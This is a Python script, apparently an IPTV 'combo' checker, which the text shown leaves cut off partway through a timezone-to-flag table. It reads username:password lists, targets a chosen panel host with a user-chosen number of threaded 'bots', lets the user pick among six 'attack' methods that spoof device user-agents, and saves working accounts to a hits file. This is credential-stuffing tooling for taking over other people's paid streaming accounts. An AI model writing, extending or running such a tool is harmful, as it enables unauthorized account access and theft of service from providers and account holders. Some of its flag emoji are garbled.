import datetime
import os
import pathlib
import re
import threading
import time
import json, sys, re
import random
from pathlib import Path
import pip
nick="👺𝙵𝙰𝚆𝚇🤴"
def clear():
	os.system('cls' if os.name == 'nt' else 'clear')

ESC = '\33['
RST = ESC + '0m'
BOLD = ESC + '1m'
P = ESC + '30m'
PC = ESC + '90m'
V = ESC + '31m'
VC = ESC + '91m'
VD = ESC + '32m'
VDC = ESC + '92m'
A = ESC + '33m'
AC = ESC + '93m'
AZ = ESC + '34m'
AZC = ESC + '94m'
M = ESC + '35m'
MC = ESC + '95m'
C = ESC + '36m'
CC = ESC + '96m'
B = ESC + '37m'
WHITE_L = ESC + '97m'
VDB = ESC + '1;32m'
PB = ESC + '30;100m'

try:
	import requests
	import urllib3
except ModuleNotFoundError:
	clear()
	print(f'{VD}[Requests] Installing module...{RST} \n')
	pip.main(['install', 'requests'])
	print(f'\n{A}[Requests] Module installed...{RST} \n')
	import requests
	import urllib3

try:
	import flag
except ModuleNotFoundError:
	clear()
	print(f'{VD}[Emoji Flags] Installing module... {RST} \n')
	pip.main(['install', 'emoji-country-flag'])
	print(f'{A}[Emoji Flags] Module installed {RST} \n')
	import flag

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP'
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

try:
	import cfscrape
	sesq = requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except ModuleNotFoundError:
	ses = requests.Session()

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass

def banner():
	clear()
	print(f'''
\n  \x1b[0;30;103m  ★   ★  👺𝙵𝙰𝚆𝚇🤴 𝙸𝙿𝚃𝚅 𝙶𝚁𝙾𝚄𝙿  ★   ★     \x1b[0m\x1b[93m''')

global current_time
global hora_ini
global time_
time_ = time.localtime()
current_time = time.strftime('%H:%M:%S', time_)
hora_ini = time.strftime('%H:%M - %d.%m.%Y', time_)
date_ini = time.strftime('%d.%m.%Y')
pattern = "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
clear()
say = 0
hit = 0
bul = 0
cpm = 1

clear()
banner()
combodosya=''
say = 0
dsy = ''
dir = "./combo/"

if not os.path.exists(dir):
	os.mkdir(dir)

for files in os.listdir(dir):
	if files.endswith('.txt'):
		say = say + 1
		dsy = dsy + f'    {VC}' + str(say) + f'{VDC} = {C}' + files + f'{C}\n{RST}'

print(f'''{dsy}
    {VDC}You have {say} Combos available!
 
   {AC} Enter the Combo number..
''')
combo_num = str(input(f'    {V} Answer = {RST}'))
say = 0
for files in os.listdir(dir):
	if files.endswith('.txt'):
		say = say + 1
		if combo_num == str(say):
			dosya = dir + files
			break

clear()
banner()
panel = input(f'''

    {VDB} Panel and Port (Panel:Port)
    
    {C} Link, Server, Dns, Panel

    {A} Enter the Panel name{RST}

    {V} Link = {C}''')
if panel=='':
	print(f'{V} you did not enter the server name, exiting...{RST}')
	exit()

say = 0

combodosya=dosya
comboc=open(dosya, 'r')
combototLen=comboc.readlines()
combouz=(len(combototLen))

clear()
banner()
num_bots=input(f'''    {C}Default Bots  = 3

    {VDB} Choose Bots from 1 to 30

    {A} Lupo Fast {RST}

    {C} Answer = {RST}''')
if num_bots=='':
	num_bots='3'

panel = panel.replace("http://","")
panel = panel.replace("/c","")
panel = panel.replace("/","")
portal = panel
fx = portal.replace(':','_')

dosya=dosya.replace('./combo/', '')
dosya=dosya.replace('.txt', '')
dosy=dosya
dosyaaa=dosy.replace('/', '')

clear()
banner()
kanall = ""
kanall = input(f'''    {C} DEFAULT CATEGORY  = 2
    
    {A} Include channel category list?{RST}
{V}
    1 = Info + Live Category
    2 = Everything (Info Live Vod Series)
    3 = Nothing (server info only)

    {C} Answer = {RST}''')
if kanall=='':
	kanall = '2'

if kanall=='1':
	categori='LIVE ONLY'
if kanall=='2':
	categori='EVERYTHING (Info Live Vod Series)'
if kanall=='3':
	categori='NO CATEGORIES'

clear()
banner()
nick=input(f'''
    {C}ᴅᴇғᴀᴜʟᴛ = 👺𝙵𝙰𝚆𝚇🤴  

    {A} Type or Paste a Nickname {RST}

    {PC}(Will appear in the File)

    {C}Nick = {RST}''')
if nick=='':
	nick='👺𝙵𝙰𝚆𝚇🤴'

clear()
banner()
attack = input(f'''
    {A} Choose the attack method{RST}
{A}
    1 = Simple-ATTACK
    2 = Ultra-Attack 
    3 = Box-Stat-Attack
    4 = Boost-Attack
    5 = Blue-Attack
    6 = Streaming-Attack

    {C} Answer = {RST}''')
if attack=='':
	attack = '1'
	atackX = f'Simple-ATTACK'

if attack=='1':
	atackX = f'Simple-ATTACK'
	authorX = f'{CC}Mᴏᴢɪʟʟᴀ{RST}'
	authorc = f'{CC}-Aᴜᴛᴏ➚⁽ᶜˡᵒᵘᵈ²⁾{RST}'
	agentx = f'{CC}CʟᴏᴜᴅFʟᴀʀᴇ-Aɢᴇɴᴛ{RST}'
	HEADERd = {
	'content-type': 'application/json; charset=UTF-8', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 14; SM-G996B Build/UP1A.231005.007)', 'Host': portal, 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'
    }
if attack=='2':
	atackX = f'Ultra-Attack'
	authorX = f'{AC}Xꜱᴇʀɪᴇꜱ{RST}'
	authorc = f'{AC}-Aᴜᴛᴏ➚⁽ᵁᴸᵀᴿᴬ⁾{RST}'
	agentx = f'{AC}Uʟᴛʀᴀ-Sᴇʀɪᴇꜱ-Aɢᴇɴᴛ{RST}'
	HEADERd = {
	'content-type': 'application/json; charset=UTF-8', 'User-Agent': '(Mozilla/5.0 (Linux; Android 9; ANE-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36)', 'Host': portal, 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'
    }
if attack=='3':
	atackX = f'Box-Stat-Attack'
	authorX = f'{AZC}Cʜʀᴏᴍᴇ{RST}'
	authorc = f'{AZC}-Aᴜᴛᴏ➚⁽ᴬᵗᵗᵃᶜᵏ⁾{RST}'
	agentx = f'{AZC}Cʜʀᴏᴍᴇ-Bᴏx-Aɢᴇɴᴛ{RST}'
	HEADERd = {
    'content-type': 'application/json; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (PlayStation Vita 3.61) AppleWebKit/537.73 (KHTML, like Gecko) Silk/3.2', 'Host': portal, 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'
    }
if attack=='4':
	atackX = f'Boost-Attack'
	authorX = f'{VC}Dᴀʟᴠɪᴋ{RST}'
	authorc = f'{VC}-Aᴜᴛᴏ➚⁽ᴮᵒᵒˢᵗ⁾{RST}'
	agentx = f'{VC}BᴏxRᴏᴋᴜ-Aɢᴇɴᴛ{RST}'
	HEADERd = {
    'content-type': 'application/json; charset=UTF-8', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 13; M2102J20SG Build/TKQ1.221013.002)', 'Host': portal, 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'
    }
if attack=='5':
	atackX = f'Blue-Attack'
	authorX = f'{AZC}Gᴇᴄᴋᴏ{RST}'
	authorc = f'{AZC}-Aᴜᴛᴏ➚⁽ᶜˡᵒᵘᵈ⁾{RST}'
	agentx = f'{AZC}Cᴜsᴛᴏᴍ-Aɢᴇɴᴛ-ᴍᴀx{RST}'
	HEADERd = {
    'content-type': 'application/json; charset=UTF-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.181 Mobile Safari/537.36', 'Host': portal, 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'
    }
if attack=='6':
	atackX = f'Streaming-Attack'
	authorX = f'{PC}Pʟᴀʏᴇʀ{RST}'
	authorc = f'{PC}-Aᴜᴛᴏ➚⁽ᴬᵗᵗᵃᶜᵏ³⁾{RST}'
	agentx = f'{PC}Oᴋʜᴛᴛᴘ-Aɢᴇɴᴛ{RST}'
	HEADERd = {
    'content-type': 'application/json; charset=UTF-8', 'User-Agent': 'okhttp/4.9.0', 'Host': portal, 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'
    }

config = input(f'''
   {VDC}  Checking before Scan...
    {A}
   ╓─👺 ℂ𝕆𝕄𝔹𝕆 👺      
   ╚ {combo_num} = {dosyaaa}   

   ╓─🤴 𝔹𝕆𝕋𝕊 🤴     
   ╚ {num_bots} Bot(s)  

   ╓─👺 ℍ𝕆𝕊𝕋 👺
   ╚ http://{panel}   

   ╓─🤴 𝔸𝕋𝕋𝔸ℂ𝕂 🤴
   ╚  {RST}{atackX}  
{A}
   ╓─👺 ℂ𝔸𝕋𝔼𝔾𝕆ℝ𝕀𝔼𝕊 👺
   ╚ {kanall} = {categori} 

   ╓─🤴 ℕ𝕀ℂ𝕂 🤴
   ╚{nick}          
       {RST}
    {VDC}Press Enter to Continue...
    s = Exit {RST}

    {C} Answer = {RST}''')
if config=='s':
	clear()
	banner()
	print(' bye bye   ')
	exit()

clear()
banner()
print(f'         {AC} Please Wait \n  {AZC}M3ULupo Checking Settings&Portal{RST}')
time.sleep(2)

hits="./hits/👺𝙵𝙰𝚆𝚇✮𝙼𝟹𝚄🤴/"
if not os.path.exists(hits):
	os.mkdir(hits)
Dosyab=hits+"👺𝙵𝙰𝚆𝚇✮𝙼𝟹𝚄🤴"+fx+"["+nick+"].txt"

def yaz(hits):
	dosya = open(Dosyab, 'a+', encoding = 'utf-8')
	dosya.write(hits)
	dosya.close()

hitz = 0

def onay(veri,user,pas):
	global hitz, hitr

	sound = 'sounds\Tiro.mp3'
	file = pathlib.Path(sound)
	try:
		if file.exists():
			ad.mediaPlay(sound)
	except:pass

	acon=""
	message=""
	acon=veri.split('active_cons":')[1].split(',')[0].replace('"',"")
	mcon=veri.split('max_connections":')[1].split(',')[0].replace('"',"")
	timezone=veri.split('timezone":"')[1]
	timezone=timezone.split('",')[0]
	timezone=timezone.split('"}')[0]
	timezone=timezone.replace("\/","/")
	timezone=timezone.replace('UTC', 'Universal Time Coordinated 🌍')
	timezone=timezone.replace('Europe/Andorra', 'Europe Andorra 🇦🇩')
	timezone=timezone.replace('Asia/Dubai', 'Asia Dubai United Arab Emirates 🇦🇪')
	timezone=timezone.replace('Asia/Kabul', 'Asia Kabul Afghanistan 🇦🇫')
	timezone=timezone.replace('America/Antigua', 'America Antigua and Barbuda 🇦🇬')
	timezone=timezone.replace('America/Anguilla', 'America Anguilla 🇦🇮')
	timezone=timezone.replace('Europe/Tirane', 'Europe Tirane Albania 🇦🇱')
	timezone=timezone.replace('Asia/Yerevan', 'Asia Yerevan Armenia 🇦🇲')
	timezone=timezone.replace('Africa/Luanda', 'Africa Luanda Angola 🇦🇴')
	timezone=timezone.replace('Antarctica/McMurdo', 'Antarctica McMurdo 🇦🇶')
	timezone=timezone.replace('Antarctica/South_Pole', 'Antarctica South Pole 🇦🇶')
	timezone=timezone.replace('America/Argentina/Buenos_Aires', 'America Buenos Aires Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/Cordoba', 'America Cordoba Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/Salta', 'America Salta Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/Jujuy', 'America Jujuy Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/Tucuman', 'America Tucuman Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/Catamarca', 'America Catamarca Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/La_Rioja', 'America La Rioja Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/San_Juan', 'America San Juan Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/Mendoza', 'America Mendoza Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/San_Luis', 'America San Luis Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/Rio_Gallegos', 'America Rio Gallegos Argentina 🇦🇷')
	timezone=timezone.replace('America/Argentina/Ushuaia', 'America Ushuaia Argentina 🇦🇷')
	timezone=timezone.replace('Europe/Vienna', 'Europe Vienna Austria 🇦🇹')
	timezone=timezone.replace('Australia/Lord_Howe', 'Australia Lord Howe Australia 🇦🇺')
	timezone=timezone.replace('Australia/Hobart', 'Australia Hobart Australia 🇦🇺')
	timezone=timezone.replace('Australia/Currie', 'Australia Currie Australia 🇦🇺')
	timezone=timezone.replace('Australia/Melbourne', 'Australia Melbourne Australia 🇦🇺')
	timezone=timezone.replace('Australia/Sydney', 'Australia Sydney Australia 🇦🇺')
	timezone=timezone.replace('Australia/Broken_Hill', 'Australia Broken Hill Australia 🇦🇺')
	timezone=timezone.replace('Australia/Brisbane', 'Australia Brisbane Australia 🇦🇺')
	timezone=timezone.replace('Australia/Lindeman', 'Australia Lindeman Australia 🇦🇺')
	timezone=timezone.replace('Australia/Adelaide', 'Australia Adelaide Australia 🇦🇺')
	timezone=timezone.replace('Australia/Lindeman', 'Australia Lindeman Australia 🇦??')
	timezone=timezone.replace('Australia/Adelaide', 'Australia Adelaide Australia 🇦🇺')
	timezone=timezone.replace('Australia/Darwin', 'Australia Darwin Australia 🇦🇺')
	timezone=timezone.replace('Australia/Perth', 'Australia Perth Australia 🇦🇺')
	timezone=timezone.replace('Australia/Eucla', 'Australia Eucla Australia 🇦🇺')
	timezone=timezone.replace('America/Aruba', 'America Aruba 🇦🇼')
	timezone=timezone.replace('Europe/Mariehamn', 'Europe Mariehamn Åland Islands 🇦🇽')
	timezone=timezone.replace('Asia/Baku', 'Asia Baku Azerbaijan 🇦🇿')
	timezone=timezone.replace('Europe/Sarajevo', 'Europe Sarajevo Bosnia and Herzegovina 🇧🇦')
	timezone=timezone.replace('America/Barbados', 'America Barbados 🇧🇧')
	timezone=timezone.replace('Asia/Dhaka', 'Asia Dhaka Bangladesh 🇧🇩')
	timezone=timezone.replace('Europe/Brussels', 'Europe Brussels Belgium 🇧🇪')
	timezone=timezone.replace('Africa/Ouagadougou', 'Africa Ouagadougou Burkina Faso 🇧🇫')
	timezone=timezone.replace('Europe/Sofia', 'Europe Sofia Bulgaria 🇧🇬')
	timezone=timezone.replace('Asia/Bahrain', 'Asia Bahrain 🇧🇾')
	timezone=timezone.replace('Africa/Bujumbura', 'Africa Bujumbura Burundi 🇧🇮')
	timezone=timezone.replace('Africa/Porto', 'Africa Porto-Novo Benin 🇧🇯')
	timezone=timezone.replace('America/St_Barthelemy', 'America Saint Barthélemy 🇧🇱')
	timezone=timezone.replace('Atlantic/Bermuda', 'Atlantic Bermuda 🇧🇲')
	timezone=timezone.replace('Asia/Brunei', 'Asia Brunei 🇧🇳')
	timezone=timezone.replace('America/La_Paz', 'America La Paz Bolivia 🇧🇴')
	timezone=timezone.replace('America/Kralendijk', 'America Kralendijk Bonaire 🇧🇶')
	timezone=timezone.replace('America/Bahia', 'America Bahia Brazil 🇧🇷')
	timezone=timezone.replace('America/Manaus', 'America Manaus Brazil 🇧🇷')
	timezone=timezone.replace('America/Belem', 'America Belém Brazil 🇧🇷')
	timezone=timezone.replace('America/Sao_Paulo', 'America São Paulo Brazil 🇧🇷')
	timezone=timezone.replace('America/Noronha', 'America Noronha Brazil 🇧🇷')
	timezone=timezone.replace('America/Fortaleza', 'America Fortaleza Brazil 🇧🇷')
	timezone=timezone.replace('America/Recife', 'America Recife Brazil 🇧🇷')
	timezone=timezone.replace('America/Araguaina', 'America Araguaína Brazil 🇧🇷')
	timezone=timezone.replace('America/Maceio', 'America Maceió Brazil 🇧🇷')
	timezone=timezone.replace('America/Campo_Grande', 'America Campo Grande Brazil 🇧🇷')
	timezone=timezone.replace('America/Cuiaba', 'America Cuiabá Brazil 🇧🇷')
	timezone=timezone.replace('America/Santarem', 'America Santarém Brazil 🇧🇷')
	timezone=timezone.replace('America/Porto_Velho', 'America Porto Velho Brazil 🇧🇷')
	timezone=timezone.replace('America/Boa_Vista', 'America Boa Vista Brazil 🇧🇷')
	timezone=timezone.replace('America/Eirunepe', 'America Eirunepé Brazil 🇧🇷')
	timezone=timezone.replace('America/Rio_Branco', 'America Rio Branco Brazil 🇧🇷')
	timezone=timezone.replace('America/Nassau', 'America Nassau Bahamas 🇧🇸')
	timezone=timezone.replace('Asia/Thimphu', 'Asia Thimphu Bhutan 🇧🇹')
	timezone=timezone.replace('Africa/Gaborone', 'Africa Gaborone Botswana 🇧🇼')
	timezone=timezone.replace('Europe/Minsk', 'Europe Minsk Belarus 🇧🇾')
	timezone=timezone.replace('America/Belize', 'America Belize 🇧🇿')
	timezone=timezone.replace('America/St_Johns', 'America Saint Johns Antigua and Barbuda 🇦🇬')
	timezone=timezone.replace('America/Halifax', 'America Halifax Canada 🇨🇦')
	timezone=timezone.replace('America/Glace_Bay', 'America Glace Bay Canada 🇨🇦')
	timezone=timezone.replace('America/Moncton', 'America Moncton Canada 🇨🇦')
	timezone=timezone.replace('America/Goose_Bay', 'America Goose Bay Canada 🇨🇦')
	timezone=timezone.replace('America/Blanc', 'America Blanc Canada 🇨🇦')
	timezone=timezone.replace('America/Montreal', 'America Montreal Canada 🇨🇦')
	timezone=timezone.replace('America/Toronto', 'America Toronto Canada 🇨🇦')
	timezone=timezone.replace('America/Nipigon', 'America Nipigon Canada 🇨🇦')
	timezone=timezone.replace('America/Thunder_Bay', 'America Thunder Bay Canada 🇨🇦')
	timezone=timezone.replace('America/Iqaluit', 'America Iqaluit Canada 🇨🇦')
	timezone=timezone.replace('America/Pangnirtung', 'America Pangnirtung Canada 🇨🇦')
	timezone=timezone.replace('America/Resolute', 'America Resolute Canada 🇨🇦')
	timezone=timezone.replace('America/Atikokan', 'America Atikokan Canada 🇨🇦')
	timezone=timezone.replace('America/Rankin_Inlet', 'America Rankin Inlet Canada 🇨🇦')
	timezone=timezone.replace('America/Winnipeg', 'America Winnipeg Canada 🇨🇦')
	timezone=timezone.replace('America/Rainy_River', 'America Rainy River Canada 🇨🇦')
	timezone=timezone.replace('America/Regina', 'America Regina Canada 🇨🇦')
	timezone=timezone.replace('America/Swift_Current', 'America Swift Current Canada 🇨🇦')
	timezone=timezone.replace('America/Edmonton', 'America Edmonton Canada 🇨🇦')
	timezone=timezone.replace('America/Cambridge_Bay', 'America Cambridge Bay Canada 🇨🇦')
	timezone=timezone.replace('America/Yellowknife', 'America Yellowknife Canada 🇨🇦')
	timezone=timezone.replace('America/Inuvik', 'America Inuvik Canada 🇨🇦')
	timezone=timezone.replace('America/Creston', 'America Creston Canada 🇨🇦')
	timezone=timezone.replace('America/Dawson_Creek', 'America Dawson Creek Canada 🇨🇦')
	timezone=timezone.replace('America/Vancouver', 'America Vancouver Canada 🇨🇦')
	timezone=timezone.replace('America/Whitehorse', 'America Whitehorse Canada 🇨🇦')
	timezone=timezone.replace('America/Dawson', 'America Dawson Canada 🇨🇦')
	timezone=timezone.replace('Indian/Cocos', 'Indian Cocos Islands 🇨🇨')
	timezone=timezone.replace('Africa/Kinshasa', 'Africa KinshasaDemocratic Republic of the Congo 🇨🇩')
	timezone=timezone.replace('Africa/Lubumbashi', 'Africa LubumbashiDemocratic Republic of the Congo 🇨🇩')
	timezone=timezone.replace('Africa/Bangui', 'Africa Bangui Central African Republic 🇨🇫')
	timezone=timezone.replace('Europe/Zurich', 'Europe Zurich Switzerland 🇨🇭')
	timezone=timezone.replace('Africa/Abidjan', "Africa Abidjan Côte d'Ivoire 🇨🇮")
	timezone=timezone.replace('Pacific/Rarotonga', 'Pacific Rarotonga Cook Islands 🇨🇰')
	timezone=timezone.replace('America/Santiago', 'America Santiago Chile 🇨🇱')
	timezone=timezone.replace('Pacific/Easter', 'Pacific Easter Island Chile 🇨🇱')
	timezone=timezone.replace('Africa/Douala', 'Africa Douala Cameroon 🇨🇲')
	timezone=timezone.replace('Asia/Shanghai', 'Asia Shanghai China 🇨🇳 ')
	timezone=timezone.replace('Asia/Harbin', 'Asia Harbin China 🇨🇳 ')
	timezone=timezone.replace('Asia/Chongqing', 'Asia Chongqing China 🇨🇳 ')
	timezone=timezone.replace('Asia/Urumqi', 'Asia Urumqi China 🇨🇳 ')
	timezone=timezone.replace('Asia/Kashgar', 'Asia Kashgar China 🇨🇳 ')
	timezone=timezone.replace('America/Bogota', 'America Bogota Colombia 🇨🇴')
	timezone=timezone.replace('America/Costa_Rica', 'America Costa Rica 🇨🇷')
	timezone=timezone.replace('America/Havana', 'America Havana Cuba 🇨🇺')
	timezone=timezone.replace('Atlantic/Cape_Verde', 'Atlantic Cape Verde 🇨🇻')
	timezone=timezone.replace('America/Curacao', 'America Curacao 🇨🇼')
	timezone=timezone.replace('Indian/Christmas', 'Indian Christmas Island 🇨🇽')
	timezone=timezone.replace('Asia/Nicosia', 'Asia Nicosia Cyprus 🇨🇾')
	timezone=timezone.replace('Europe/Prague', 'Europe Prague Czech Republic 🇨🇿')
	timezone=timezone.replace('Europe/Berlin', 'Europe Berlin Germany 🇩🇪')
	timezone=timezone.replace('Africa/Djibouti', 'Africa Djibouti 🇩🇯')
	timezone=timezone.replace('Europe/Copenhagen', 'Europe Copenhagen Denmark 🇩🇰')
	timezone=timezone.replace('America/Dominica', 'America Dominica 🇩🇲')
	timezone=timezone.replace('America/Santo_Domingo', 'America Santo Domingo Dominican Republic 🇩🇴')
	timezone=timezone.replace('Africa/Algiers', 'Africa Algiers Algeria 🇩🇿')
	timezone=timezone.replace('America/Guayaquil', 'America Guayaquil Ecuador 🇪🇨')
	timezone=timezone.replace('Pacific/Galapagos', 'Pacific Galápagos Islands Ecuador 🇪🇨')
	timezone=timezone.replace('Europe/Tallinn', 'Europe Tallinn Estonia 🇪🇪')
	timezone=timezone.replace('Africa/Cairo', 'Africa Cairo Egypt 🇪🇬')
	timezone=timezone.replace('Africa/El_Aaiun', 'Africa El Aaiun Western Sahara 🇪🇭')
	timezone=timezone.replace('Africa/Asmara', 'Africa Asmara Eritrea 🇪🇷')
	timezone=timezone.replace('Europe/Madrid', 'Europe Madrid Spain 🇪🇸 ')
	timezone=timezone.replace('Africa/Ceuta', 'Africa Ceuta Spain 🇪🇸 ')
	timezone=timezone.replace('Atlantic/Canary', 'Atlantic Canary Islands Spain 🇪🇸 ')
	timezone=timezone.replace('Africa/Addis_Ababa', 'Africa Addis Ababa Ethiopia 🇪🇹')
	timezone=timezone.replace('Europe/Helsinki', 'Europe Helsinki Finland 🇫🇮')
	timezone=timezone.replace('Pacific/Fiji', 'Pacific Fiji 🇫🇯')
	timezone=timezone.replace('Atlantic/Stanley', 'Atlantic Stanley Falkland Islands 🇫🇰')
	timezone=timezone.replace('Pacific/Chuuk', 'Pacific Chuuk Micronesia 🇫🇲')
	timezone=timezone.replace('Atlantic/Faroe', 'Atlantic Faroe Islands 🇫🇴')
	timezone=timezone.replace('Europe/Paris', 'Europe Paris France 🇫🇷')
	timezone=timezone.replace('Africa/Libreville', 'Africa Libreville Gabon 🇬🇦')
	timezone=timezone.replace('Europe/London', 'Europe London Great Britain 🇬🇧')
	timezone=timezone.replace('America/Grenada', 'America Grenada 🇬🇩')
	timezone=timezone.replace('Asia/Tbilisi', 'Asia Tbilisi Georgia 🇬🇪')
	timezone=timezone.replace('America/Cayenne', 'America Cayenne French Guiana 🇬🇫')
	timezone=timezone.replace('Europe/Guernsey', 'Europe Guernsey 🇬🇬')
	timezone=timezone.replace('Africa/Accra', 'Africa Accra Ghana 🇬🇭')
	timezone=timezone.replace('Europe/Gibraltar', 'Europe Gibraltar 🇬🇮')
	timezone=timezone.replace('America/Godthab', 'America Godthab Greenland 🇬🇱')
	timezone=timezone.replace('America/Danmarkshavn', 'America Danmarkshavn Greenland 🇬🇱')
	timezone=timezone.replace('America/Scoresbysund', 'America Scoresbysund Greenland 🇬🇱')
	timezone=timezone.replace('America/Thule', 'America Thule Greenland 🇬🇱')
	timezone=timezone.replace('Africa/Banjul', 'Africa Banjul Gambia 🇬🇲')
	timezone=timezone.replace('Africa/Conakry', 'Africa Conakry Guinea 🇬🇳')
	timezone=timezone.replace('America/Guadeloupe', 'America Guadeloupe 🇬🇵')
	timezone=timezone.replace('Africa/Malabo', 'Africa Malabo Equatorial Guinea 🇬🇶')
	timezone=timezone.replace('Europe/Athens', 'Europe Athens Greece 🇬🇷')
	timezone=timezone.replace('Atlantic/South_Georgia', 'Atlantic South Georgia and the South Sandwich Islands 🇬🇸')
	timezone=timezone.replace('America/Guatemala', 'America Guatemala 🇬🇹')
	timezone=timezone.replace('Pacific/Guam', 'Pacific Guam 🇬🇺')
	timezone=timezone.replace('Africa/Bissau', 'Africa Bissau Guinea-Bissau 🇬🇼')
	timezone=timezone.replace('America/Guyana', 'America Guyana 🇬🇾')
	timezone=timezone.replace('Asia/Hong_Kong', 'Asia Hong Kong 🇭🇰')
	timezone=timezone.replace('America/Tegucigalpa', 'America Tegucigalpa Honduras 🇭🇳')
	timezone=timezone.replace('Europe/Zagreb', 'Europe Zagreb Croatia 🇭🇷')
	timezone=timezone.replace('America/Port', 'America Port-au-Prince Haiti 🇭🇹')
	timezone=timezone.replace('Europe/Budapest', 'Europe Budapest Hungary 🇭🇺')
	timezone=timezone.replace('Asia/Jakarta', 'Asia Jakarta Indonesia 🇮🇩 ')
	timezone=timezone.replace('Asia/Pontianak', 'Asia Pontianak Indonesia 🇮🇩 ')
	timezone=timezone.replace('Asia/Makassar', 'Asia Makassar Indonesia 🇮🇩 ')
	timezone=timezone.replace('Asia/Jayapura', 'Asia Jayapura Indonesia 🇮🇩 ')
	timezone=timezone.replace('Europe/Dublin', 'Europe Dublin Ireland 🇮🇪')
	timezone=timezone.replace('Asia/Jerusalem', 'Asia Jerusalem Israel 🇮🇱')
	timezone=timezone.replace('Europe/Isle_of_Man', 'Europe Isle of Man 🇮🇲')
	timezone=timezone.replace('Asia/Kolkata', 'Asia Kolkata India 🇮🇳')
	timezone=timezone.replace('Indian/Chagos', 'Indian Chagos British Indian Ocean Territory 🇮🇴')
	timezone=timezone.replace('Asia/Baghdad', 'Asia Baghdad Iraq 🇮🇶')
	timezone=timezone.replace('Asia/Tehran', 'Asia Tehran Iran 🇮🇷')
	timezone=timezone.replace('Atlantic/Reykjavik', 'Atlantic Reykjavik Iceland 🇮🇸')
	timezone=timezone.replace('Europe/Rome', 'Europe Rome Italy 🇮🇹')
	timezone=timezone.replace('Europe/Jersey', 'Europe Jersey 🇯🇪')
	timezone=timezone.replace('America/Jamaica', 'America Jamaica 🇯🇲')
	timezone=timezone.replace('Asia/Amman', 'Asia Amman Jordan 🇯🇴')
	timezone=timezone.replace('Asia/Tokyo', 'Asia Tokyo Japan 🇯🇵')
	timezone=timezone.replace('Africa/Nairobi', 'Africa Nairobi Kenya 🇰🇪')
	timezone=timezone.replace('Asia/Bishkek', 'Asia Bishkek Kyrgyzstan ??🇬')
	timezone=timezone.replace('Asia/Phnom_Penh', 'Asia Phnom Penh Cambodia 🇰🇭')
	timezone=timezone.replace('Pacific/Tarawa', 'Pacific Tarawa Kiribati 🇰🇮')
	timezone=timezone.replace('Pacific/Enderbury', 'Pacific Enderbury Kiribati 🇰🇮')
	timezone=timezone.replace('Pacific/Kiritimati', 'Pacific Kiritimati Kiribati 🇰🇮')
	timezone=timezone.replace('Indian/Comoro', 'Indian Comoro Islands 🇰🇲')
	timezone=timezone.replace('America/St_Kitts', 'America Saint Kitts and Nevis 🇰🇳')
	timezone=timezone.replace('Asia/Pyongyang', 'Asia Pyongyang North Korea 🇰🇵')
	timezone=timezone.replace('Asia/Seoul', 'Asia Seoul South Korea 🇰🇷')
	timezone=timezone.replace('Asia/Kuwait', 'Asia Kuwait 🇰🇼')
	timezone=timezone.replace('America/Cayman', 'America Cayman Islands 🇰🇾')
	timezone=timezone.replace('Asia/Almaty', 'Asia Almaty Kazakhstan 🇰🇿 ')
	timezone=timezone.replace('Asia/Qyzylorda', 'Asia Qyzylorda Kazakhstan 🇰🇿 ')
	timezone=timezone.replace('Asia/Aqtobe', 'Asia Aqtobe Kazakhstan 🇰🇿 ')
	timezone=timezone.replace('Asia/Aqtau', 'Asia Aqtau Kazakhstan 🇰🇿 ')
	timezone=timezone.replace('Asia/Oral', 'Asia Oral Kazakhstan 🇰🇿 ')
	timezone=timezone.replace('Asia/Vientiane', 'Asia Vientiane Laos 🇱🇦')
	timezone=timezone.replace('Asia/Beirut', 'Asia Beirut Lebanon 🇱🇧')
	timezone=timezone.replace('America/St_Lucia', 'America Saint Lucia 🇱🇨')
